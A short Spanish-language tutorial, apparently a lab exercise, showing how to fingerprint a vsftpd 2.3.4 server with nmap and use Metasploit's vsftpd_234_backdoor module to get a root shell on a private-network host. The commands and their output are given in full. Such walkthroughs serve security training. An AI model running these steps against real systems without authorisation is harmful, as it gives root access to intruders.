# Uso de Metasploit para atacar vsftpd

Correr Nmap para determinar el tipo de servidor FTP presente:

`nmap -p 21 192.168.100.93 -A`  

Lo que nos entrega los siguientes resultados:  

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-08 19:00 EDT
Nmap scan report for 192.168.100.93
Host is up (0.00080s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.100.99
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results a/ .
Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
```  

Abrir Metasploit con el comando `msfconsole`.  

Dentro de Metasploit buscar `vsftpd 2.3.4`. Se nos despliega un resultado. Podemos cargar ese módulo utilizando `Use 0`.

Con el comando `Show options` se nos despliegan los parámetros necesarios a configurar.  

```

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/
                                      Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic
   
```

Agregamos el `RHOST` (la dirección de la víctima).

`set RHOST direccion.de.la.victima`  

Ejecutamos el ataque con `run`.  

A continuación obtenemos un shell remoto como administradores del servidor:  

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.168.100.93:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.100.93:21 - USER: 331 Please specify the password.
[+] 192.168.100.93:21 - Backdoor service has been spawned, handling...
[+] 192.168.100.93:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.100.99:40451 -> 192.168.100.93:6200) at 2022-09-08 19:20:30 -0400

```

